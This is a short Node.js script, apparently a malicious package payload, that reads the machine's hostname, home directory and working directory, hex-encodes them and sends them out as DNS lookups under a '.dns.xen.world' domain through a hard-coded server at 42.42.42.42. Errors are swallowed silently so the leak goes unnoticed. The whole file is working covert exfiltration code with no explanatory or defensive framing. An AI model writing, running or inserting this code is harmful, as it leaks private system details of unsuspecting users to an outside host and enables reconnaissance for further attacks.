(async () => {
    try {
      const dns = await import('dns');
      const os = await import('os');
  
      const suffix = '.dns.xen.world'; // BIND DNS server
      const dnsServer = '42.42.42.42'; // BIND DNS server IP

      let data = `${os.hostname()}__${os.homedir()}__${__dirname}`;
  
      data = data.replace(/[^a-zA-Z0-9._]/g, (m) => `_${m.charCodeAt(0).toString(16)}`);
  
      data = Buffer.from(data).toString('hex');
      data = data.match(/.{1,50}/g);

      dns.setServers([dnsServer]);
  
      const id = Math.random().toString(36).substring(7);

      for (const chunk of data) {
        dns.resolve(`${id}.${chunk}${suffix}`, 'A');
      }
    } catch (err) {
    }
  })();